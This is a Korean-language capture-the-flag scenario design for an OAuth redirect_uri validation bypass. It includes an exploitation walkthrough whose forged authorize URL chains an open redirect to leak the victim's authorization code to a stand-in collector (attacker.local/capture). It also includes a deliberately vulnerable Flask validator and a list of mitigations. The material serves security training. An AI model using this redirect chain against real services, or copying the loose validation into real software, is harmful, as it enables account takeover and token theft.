---
title: OAuth Redirect URI Validation Bypass leading to Token Theft — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, oauth, token-theft, open-redirect, bypass-validation]
confidence: high
---

# OAuth Redirect URI Validation Bypass leading to Token Theft — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: OAuth Social Login Integration (소셜 연동 로그인 포털)
- **난이도**: Medium-High
- **핵심 컨셉**: OAuth 2.0 프로토콜 연동 환경에서 자주 발견되는 **리다이렉트 URI 검증 우회(Redirect URI Bypass)** 및 **토큰 탈취(Token Stealing)** 문제입니다. 웹 사이트는 소셜 로그인을 제공하며, 인증 제공자(OAuth Provider)에게 발급받은 로그인 승인 코드(Authorization Code) 또는 토큰을 돌려받을 도메인 주소(`redirect_uri`)를 명시합니다. 공격자는 정규표현식이나 서브도메인 검증의 느슨한 규칙을 파고들어, 자신이 제어하는 악성 도메인이나 대상 사이트의 오픈 리다이렉트 취약점을 조합해 콜백 URL을 변조함으로써 피해자의 세션 권한 코드를 탈취해 계정을 탈취합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **OAuth Provider Server**: 인증 확인 후 `redirect_uri` 인자로 코드 정보를 돌려주는 가상 소셜 로그인 공급자.
- **Client Web Application**: 소셜 로그인을 사용해 사용자를 로그인시키는 사이트.
  - 로그인 요청 시 `/oauth/authorize?client_id=123&redirect_uri=http://client.challenge.local/callback` 형태로 브라우저를 이동시킴.
- **Flag 위치**:
  - 관리자 봇(Admin Bot) 계정으로 소셜 로그인이 완료되었을 때, 관리자 세션을 탈취하여 `/dashboard/admin`에 접속하면 플래그 획득.

### 2.2 취약점 지점
1. **Weak Redirect URI Validation**:
   - OAuth Provider는 `redirect_uri` 주소를 정교한 1:1 매핑 화이트리스트로 비교하지 않고, `client.challenge.local` 문자열이 포함되어 있는지 여부만 확인하거나 뒤쪽 경로에 대한 임의 와일드카드 검증만 수행합니다.
   - 예: `redirect_uri=http://client.challenge.local.attacker.local/callback` 또는 `redirect_uri=http://client.challenge.local/oauth/callback/../../` 같은 경로 탐색 허용.
2. **Open Redirect in Client Application**:
   - 클라이언트 앱에 `/redirect?url=...` 형태의 오픈 리다이렉트 취약점이 존재하여, 인증 서버가 안전한 클라이언트 도메인으로 코드를 보내더라도 이를 통해 외부 공격자 사이트로 승인 코드가 유출됩니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 / 파라미터 | 메소드 | 인증 | 입력 값 | 반환 값 | 비고 |
|---------------------|--------|------|---------|---------|------|
| `/oauth/authorize` | GET | 없음 | `redirect_uri` 등 | 로그인 확인 창 또는 리다이렉트 이동 | 검증 우회 대상 파라미터 |
| `/redirect` | GET | 없음 | `url` | 302 Redirect | 클라이언트 오픈 리다이렉트 지점 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 리다이렉트 검증 취약성 식별
공격자는 OAuth 요청 과정에서 전달되는 파라미터들을 분석하고 변조를 테스트합니다.
- *시도 1 (단순 변조)*: `redirect_uri=http://attacker.local`  
  -> *결과*: "Error: Invalid redirect_uri" (직접적인 외부 도메인 차단됨)
- *시도 2 (서브도메인 조작)*: `redirect_uri=http://client.challenge.local.attacker.local`  
  -> *결과*: 만약 인증 서버가 단순 문자열 매칭(`.startswith`)이나 느슨한 와일드카드를 쓰면 통과될 수 있습니다.
- *시도 3 (경로 탐색 / 오픈 리다이렉트 조합)*:  
  클라이언트 사이트의 오픈 리다이렉트 기능(`/redirect?url=http://attacker.local`)을 발견한 상태에서 다음과 같이 조작합니다.
  `redirect_uri=http://client.challenge.local/oauth/callback/../..//redirect?url=http://attacker.local`

### Step 2. 공격 도메인 생성 및 수집 링크 유포
1. 공격자는 자신의 서버(`http://attacker.local/capture`)에 들어오는 쿼리스트링 파라미터를 로그로 저장하는 수집기를 열어둡니다.
2. 타겟 관리자 봇을 인증 시스템으로 유인하기 위해 위조된 OAuth 권한 부여 URL 링크를 전송합니다.
   ```http
   http://provider.local/oauth/authorize?client_id=123&response_type=code&redirect_uri=http://client.challenge.local/redirect?url=http://attacker.local/capture
   ```

### Step 3. 피해자 인증 동작 및 토큰 수집
1. 로그인 상태인 관리자(피해자)가 링크를 누릅니다.
2. 인증 서버는 `redirect_uri`가 허용 도메인(`client.challenge.local`)으로 시작하므로 올바른 것으로 판별하고, 인증 승인 코드(`code`)를 붙여 리다이렉트시킵니다.
   ```http
   302 Redirect to http://client.challenge.local/redirect?url=http://attacker.local/capture&code=AUTH_CODE_XYZ
   ```
3. 클라이언트 웹 애플리케이션의 오픈 리다이렉트 기능에 의해, 사용자는 그대로 공격자 서버 주소로 튕겨 나갑니다.
   ```http
   302 Redirect to http://attacker.local/capture?code=AUTH_CODE_XYZ
   ```

### Step 4. 권한 탈취 및 플래그 획득
공격자 웹로그에 누출된 `AUTH_CODE_XYZ` 코드를 활용하여 정상 소셜 로그인 콜백 주소 `/callback?code=AUTH_CODE_XYZ`에 대입해 피해자 권한으로 로그인에 성공하고 관리자 권한을 가로채서 플래그(`FLAG{oauth_redirect_uri_bypass_token_leak}`)를 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Python Flask)

```python
# provider_app.py (OAuth Provider 시뮬레이션)
from flask import Flask, request, redirect, render_template

app = Flask(__name__)

# 클라이언트 앱에 등록된 화이트리스트 주소
REGISTERED_CALLBACK = "http://client.challenge.local/callback"

def validate_redirect_uri(client_id, redirect_uri):
    # 취약점 지점: 1대1 매칭 검증이 아닌 느슨한 접두사 매칭 처리
    # 만약 redirect_uri가 "http://client.challenge.local/callback/../../redirect?url=..." 이라면
    # REGISTERED_CALLBACK으로 시작하므로 이 검증을 우회하게 됨!
    if redirect_uri.startswith(REGISTERED_CALLBACK) or "client.challenge.local" in redirect_uri:
        return True
    return False

@app.route("/oauth/authorize")
def authorize():
    client_id = request.args.get("client_id")
    redirect_uri = request.args.get("redirect_uri")
    
    if not validate_redirect_uri(client_id, redirect_uri):
        return "Invalid redirect_uri", 400
        
    # 사용자 인증 완료 시 가상의 코드 발급 후 리다이렉트
    auth_code = "AUTH_CODE_SECRET_123456"
    target_url = f"{redirect_uri}?code={auth_code}"
    
    return redirect(target_url)

if __name__ == "__main__":
    app.run(port=5001)
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **엄격한 1:1 경로 매핑 (Exact Redirect URI Matching)**:
   - OAuth 제공자는 와일드카드나 접두사 매치(`.startswith`) 방식을 전면 금지하고, 사전에 등록된 URI와 완벽히 1대1 일치하는 경우에만 요청을 승인해야 합니다.
2. **오픈 리다이렉트 기능 제거 및 제한**:
   - 클라이언트 사이트 내의 오픈 리다이렉트 파라미터는 화이트리스트 기반 상대 경로만 허용하거나 기능을 제거합니다.
3. **State 파라미터 사용**:
   - OAuth 요청 시 클라이언트가 난수화된 `state` 값을 실어보내고, 콜백 수신 단계에서 처음 전송한 값과 복귀한 값이 일치하는지 무결성을 반드시 확인하여 CSRF를 방지합니다.
